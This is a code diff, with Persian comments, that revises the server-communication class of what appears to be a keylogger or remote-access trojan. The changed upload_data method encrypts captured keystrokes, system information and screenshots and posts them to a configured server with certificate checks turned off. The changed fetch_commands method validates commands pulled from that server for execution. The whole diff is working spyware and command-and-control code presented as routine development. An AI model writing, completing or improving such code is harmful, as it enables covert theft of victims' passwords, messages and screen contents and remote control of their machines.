@@ -36,21 +36,32 @@ class ServerCommunicator:
             raise CommunicationError(f"Server error: {response.status_code}")
 
     def upload_data(self, keystrokes, system_info, screenshot=None):
-        encrypted_data = {
-            "keystrokes": self.encryption.encrypt(' '.join(keystrokes)),
-            "system_info": self.encryption.encrypt(json.dumps(system_info))
-        }
-        
-        return self._send_request(
-            "upload",
-            data={
+        try:
+            encrypted_data = {
+                "action": "upload_data",  # اضافه کردن اکشن الزامی
                 "client_id": self.client_id,
                 "token": Config.SECRET_TOKEN,
-                **encrypted_data
-            },
-            files={'screenshot': ('screen.png', screenshot, 'image/png')} if screenshot else None
-        )
-
+                "keystrokes": self.encryption.encrypt(' '.join(keystrokes)),
+                "system_info": self.encryption.encrypt(json.dumps(system_info))
+            }
+    
+            files = {}
+            if screenshot:
+                files['screenshot'] = ('screenshot.png', screenshot, 'image/png')
+    
+            response = requests.post(
+                Config.SERVER_URL,
+                data=encrypted_data,
+                files=files,
+                timeout=Config.COMMAND_TIMEOUT,
+                verify=False
+            )
+            
+            if response.status_code != 200:
+                raise CommunicationError(f"Upload failed: {response.text}")
+                
+        except Exception as e:
+            raise CommunicationError(f"Upload error: {str(e)}")
     def fetch_commands(self):
         response = self._send_request(
             "commands",
@@ -60,9 +71,18 @@ class ServerCommunicator:
                 "token": Config.SECRET_TOKEN
             }
         )
+        
+        # اعتبارسنجی ساختار پاسخ
         if not isinstance(response, list):
-            raise CommunicationError("Expected a list of commands")
-        return response
+            raise CommunicationError("Invalid commands format")
+            
+        validated_commands = []
+        for cmd in response:
+            if not all(k in cmd for k in ('id', 'command', 'type')):
+                continue  # یا خطا ثبت کنید
+            validated_commands.append(cmd)
+        
+        return validated_commands
 
     def send_command_result(self, command_id, result):
         return self._send_request(
